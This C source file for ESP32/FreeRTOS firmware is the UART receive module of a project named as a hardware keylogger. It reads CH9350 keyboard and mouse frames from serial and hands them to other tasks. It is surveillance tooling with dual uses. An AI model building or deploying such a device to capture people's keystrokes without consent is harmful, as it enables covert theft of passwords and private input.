#include <stdio.h>
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "driver/uart.h"
#include "driver/gpio.h"
#include "esp_log.h"

#include "configKeylogger.h"
#include "Decoder/CH9350/CH9350_decode.h"

static const char *TAG = "UART";
static QueueHandle_t uart_queue;

EventGroupHandle_t uart_semaphore;
volatile char uart_data[KEYLOGGER_UART_RX_BUFFER_SIZE];

void uart_task(void *pvParameters)
{
    uart_event_t event;
    for (;;)
    {
        if (xQueueReceive(uart_queue, (void *)&event, portMAX_DELAY))
        {
            memset(uart_data, 0, KEYLOGGER_UART_RX_BUFFER_SIZE);
            switch (event.type)
            {
            case UART_DATA:
                uart_read_bytes(KEYLOGGER_UART_PORT_NUM, uart_data, event.size, 0);
                uart_data[event.size] = '\0';

                if (!(is_CH9350_key_data(uart_data) ||
                      is_CH9350_mouse_data(uart_data)))
                    break;

                xEventGroupSetBits(uart_semaphore, BIT(3));

                xEventGroupWaitBits(uart_semaphore, BIT(0) | BIT(1), pdTRUE, pdTRUE, portMAX_DELAY);

                xEventGroupClearBits(uart_semaphore, BIT(3));
                break;
            case UART_FIFO_OVF:
                uart_flush_input(KEYLOGGER_UART_PORT_NUM);
                xQueueReset(uart_queue);
                break;
            case UART_BUFFER_FULL:
                uart_flush_input(KEYLOGGER_UART_PORT_NUM);
                xQueueReset(uart_queue);
                break;
            default:
                break;
            }
        }
    }
    vTaskDelete(NULL);
}

void uart_init()
{
    uart_config_t uart_config = {
        .baud_rate = KEYLOGGER_UART_BAUD_RATE,
        .data_bits = UART_DATA_8_BITS,
        .parity = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_DEFAULT,
    };

    ESP_ERROR_CHECK(uart_driver_install(KEYLOGGER_UART_PORT_NUM, KEYLOGGER_UART_RX_BUFFER_SIZE * 2, 0, KEYLOGGER_UART_QUEUE_LENGTH, &uart_queue, 0));
    ESP_ERROR_CHECK(uart_param_config(KEYLOGGER_UART_PORT_NUM, &uart_config));
    ESP_ERROR_CHECK(uart_set_pin(KEYLOGGER_UART_PORT_NUM, KEYLOGGER_UART_TXD, KEYLOGGER_UART_RXD, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE));

    uart_semaphore = xEventGroupCreate();
}
